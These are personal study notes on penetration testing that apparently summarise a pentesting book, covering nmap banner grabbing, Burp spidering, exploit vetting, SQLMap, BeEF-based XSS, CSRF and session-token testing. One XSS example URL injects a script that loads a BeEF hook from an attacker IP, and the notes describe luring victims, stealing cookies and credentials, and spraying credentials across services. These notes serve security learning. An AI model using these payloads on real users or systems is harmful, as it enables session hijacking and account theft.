
# OSINT
1. Recon-NG
2. https://github.com/leebaird/discover
	`/discover.sh`

# Network Scan
1. Banner grabbing
`nmap —script/usr/share/nmap/scripts/banner-plus.nse –min-rate=400 —min-parallelism=512 -p1-
65535 -n -Pn -PS -oA/opt/peepingtom/report <IP CIDR>`
## Switch list:
—script = location of the banner-plus script we downloaded in the setup area
—min-rate = guarantee that a scan will be finished by a certain time
—min-parallelism = speed up total number of probes
-p1-65535 = scan all 65k ports
-n = disable DNS resolution (helps speed scans)
-Pn = disable ping (a lot of servers will have ping disabled on the external network)
-PS = TCP SYNPing
-oA = export all types of reports

2. Peeping tom
useful for looking home pages of web servers to get an estimate of their value
handy when having pentests of 100+ web services


# Attack
1. AD
2. 

# web application scanning
1. Spider/Discovery/Scanning with Burp Pro (Identify hidden folders, admin pages, configuration pages, and other pages that will prove useful to a tester)
2. Scanning with a web application scanner
3. Manual parameter injection
4. Session token analysis

## the important information we gain from spidering
*We spider first because we need to identify where all the links are, what types of parameters are used
in the application, what external sites the application references to, and the overall layout of how the
application functions.*

## achieving visbility of the surface of the web application
*Remember that how the Burp Suite tool works is to configure your web browser to talk through the Burp Suite and then to the web application(s). This will give you full visibility in the requests made by the browser and also give you the ability to modify the raw requests regardless of client side protections.*

## finding hidden web pages for exploitation
*There are times where pages or folders are not directly linked from a web application. For example, often I’ve seen that the admin folder or login page are not referenced anywhere on the site. You might see that in your browser bar you go to the/admin/folder and you are taken to the admin authentication page, but this might have been missed during the spidering phase. This is usually because host administrators are trying to hide these folders and administrative login pages from general users. These are the exact types of things you are looking for in a test, so that you can try to bypass or brute force the authentication process.*
	*There is a specific module within Burp that is extremely helpful in these scenarios. Within the same Site map tab, you right click on the parent URL, drop down to the “Engagement tools”, and click on “Discover content”*

## smarter wordlists
*Modifying the web application spidering wordlist is very important in saving time*

## what attacking a web app entails:
*Once you feel comfortable that you have identified an adequate portion of the site, you can start attacking the parameters, requests, and looking for vulnerabilities*

## fuzzing the web application
burp can start actively scanning a host and fuzzing input parameters

## decreasing the number of requests for the site's sake

## OWASP webgoat for getting hands dirty with web hacking

## burp can do more
*Burp will do a lot more than just check for XSS vulnerabilities. It can identify CSRF issues, bad SSL
certs, directory traversal vulnerabilities, SQL injections, command injections, and much more. To see
more uses of Burp, go to the section in this book about Web Application Pentesting*


# Book part II: Exploitation
1. searching for a working exploit based on versions from banner grabbing
2. understanding scripts to exploit vulnerabilities
## MSF
1. developing
2. exploiting
3. assisting in attacks

## encoding payloads

## understanding exploit script function (Python, C++, Ruby, Perl, Bash ..etc.)
*As a penetration tester, you need to be familiar with how to edit, modify, execute, and understand regardless of the language and be able to understand why an exploit works. I don’t recommend you ever execute a script without testing it first. I have honestly seen a few scripts on forums and ExploitDB where the shell code payload actually causes harm to the intended system. After the script exploits the vulnerability the payload deletes everything on the vulnerable host. I’m pretty sure that your client would not be too happy if everything on his host system was wiped clean. That is why either you should always use your own shell code or validate the shell code that is within the script*

## on exploits:
1. how it is run
2. script language
3. needs compiling?
4. dependencies and conditions for exploit to work
5. hard-coded values to be modified
6. exploit impact
7. tested? on what?
*some exploit can fail due to language settings on the operating system*

## testing exploits
### what's the challenges with that?
1. time and effort required to create test environment
2. the probability of different configurations between the test environment and production

## Just as Sysadmins troubleshoot applications ... pentesters troubleshoot exploits XD
*It is more important to understand why an attack works and what the underlying issue is, so that if a tool fails to work, you have the ability to modify and fix that exploit*

## want to get better at exploitation?
*What helped me learn how to exploit computers was to take exploits from sites like http://www.exploit-db.com/remote/ and recreate them in another high level scripting language of my choice. Developing these types of scripts and testing them against your own servers will help you gain a much stronger background in coding and a better understanding why vulnerabilities work*

# Book part III: Web application pentesting
## Vulns:
1. SQLi
2. XSS
3. CSRF
4. session token entropy
5. fuzzing/input validation
6. business logic
These vulns can lead to:
1. compromised user base
2. application
3. system

## SQLi
can lead to full compromise of the DB or system
### Tools:
1. SQLMap --> find SQLi, manipulate DB queries & dump databases and maybe get shell
2. SQLNinja
GET and POST Paremeters --> most commonly identified types of SQLi
### Tips:
- knowing the database type helps by setting the `--dbms=<DB Type>` flag
- if the vuln requires authentication, log onto the website and get the cookie and set it using the `--data=<COOKIE>` 
- use the sqlmap `--wizard` switch to make things easier

### POST paremeter
in post requests, the username and password are in the data section. web servers log the GET parameters and we don't want the logs to reveal the usernames and passwords. Also, there are data limitations in the GET request. POST requests are used for passing larger amounts of data.

### SQLNinja
### what's the reason behind learning two tools? SQLMap and SQLNinja?
*From many years of experience, I’ve seen a large number of tests that identify SQLi with only one tool or the other. This might because how it detects blind SQLi, how they upload binaries, IPS signatures that might detect one tool or the other, or how they handle cookies. There are so many different variables and it’s smart to always double check your work*

## Validating remote command execution by issues pings back to our attacking machine

## XSS
XSS is a user attack that is caused by the lack of input validation of the application & which allow an attacker to write script code into a user’s browsers
### Tool: BeEf
what can be done with BeEF?
- steal the contents of the copy memory
- redirect them to links
- turn on their camera

### attacking:
1. we are going to craft a URL that uses JavaScript to include the hook.js file. It will look something like: http://securepla.net/xss_example/example.php? alert=asda<script src=http://192.168.10.91:3000/hook.js></script>
2. Once you trick a victim to go to that URL using Social Engineering Tactics, they will be part of your XSS zombie network

### attack consequences:
1. steal stored credentials
2. steal cookies for sessions
### Bonus attack:
BeEF module: petty theft (create password prompt pages for Google/FB)

### XSS Types:
1. stored (doesn't require social engineering, we just plant the beef hook and wait for users to load the page)
2. reflect (requires social engineering for sending the link and the user to click it)

### obfuscating javascript to bypass filters
http://www.reddit.com/r/xss+
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

## CSRF (when you can force an action to happen to a victim that is
unwanted)

### the correct process
- In a correct process, there would be a CSRF token generated on every page and whenever you progressed through the application, it would verify the previous token. You can think of this as tracking the current session/process and if any of those tokens are empty or wrong, do not process a transaction.

### testing for CSRF:
- There are many complex ways to test this, but the easiest way I manually run these tests is through proxying traffic. What I’ll do is exactly what I said above and I’ll go through the process of making a transaction and seeing if I can replay it.
- getting the request that performs the transaction and tricking a user to visit the URL would trigger the action
- visiting the url to test if the action was carried out is the way to test CSRF
- The application shouldn’t have allowed the user to transfer money again without going through all the steps required to create a transfer requests. Without a CSRF token, you could have an unsuspecting victim click a link and have unauthorized transfers occur

### Malicious actions I can think of:
1. money transfer
2. password reset

### link:
https://www.owasp.org/index.php/CrossSite_Request_Forgery_(CSRF)


## Session tokens:
they are used for tracking sessions
### what we look for:
1. if they can be guessed or not
2. they properly track a user (?)
3. time of expiry
4. if they are secure (?)
5. if they validate input (?)
6. if they are proper utilized (?)

### testing:
capturing the authentication process using burp and checking if the session tokens are truly random or not

## Additional fuzzing/input validation


# Quotes
- The great thing about being a penetration tester is that you have to get creative and use all sorts of resources
- This is why penetration testing is so much fun. You really can’t just run tools, but you have to use your own creativity to give your customer the best and most real type of attack they might receive
- As a penetration tester, the problem with scanning large ranges is organizing that data and identifying which low hanging fruit you want to attack first
- hitting beta/dev sites is a good way to find easy vulns
*the crazy importance of data and what can be done with it*
- One additional reason I look for sites that require authentication is because they generally tell me that the application has additional functionality and has a better chance of revealing web application issues or default passwords
*the company you're pentesting, they are either GODLY secured or something before that ... there's a large probability that they can be exploited. because the chance of having complete security is 0.00001% ... they rest should exploitable*
*TO SUM IT UP: it's more likely that a certain network or device can be hacked than not*

*what I need is eyes that can see vulnerabilities and exploit them --> killer instinct*

# killer instinct:
1. merriam webster: an aggressive tenacious urge for domination in a struggle to attain a set goal
2. my definition: a sharp highly critical eye for flaws and how to severely exploit and punish them. that requires a fundamental idea of perfection and flawlessness and the knack to detect what's missing and what's less than GODLIKE!
3. Normal people pretend to not care. But killers really, really couldn’t give a rat’s ass, your opinion of them usually doesn’t even cross their mind
4. giving up is not there. deeper analysis. creative lateral thinking all to kill
5. crushing the opposition in totality
6. coming alive in challenges
7. single ray of laser focus (obsessed)
8. they don't dance around the real subject (highly targeted)
9. 110% effort and using intelligence in every thought
10. don't lose focus
11. extremely clear head and one thought or interaction taking all the brain's resources. 100% present in the moment

## in cybersecurity:
1. a deep understanding of the nature of how everything works and every type of vulnerability and an equally deep understanding of how to exploit them

# Better Googling
- Make sure that all words are spelled correctly.
- Try different keywords.
- Try more general keywords.
- Try fewer keywords.

# Techniques in development
1. spraying everywhere that takes creds:
	- ssh
	- ftp
	- kerb/owa/smb/rdp
	- webapps

# To-do
1. take a loot at all the wordlists and try to improve them and add intelligence to them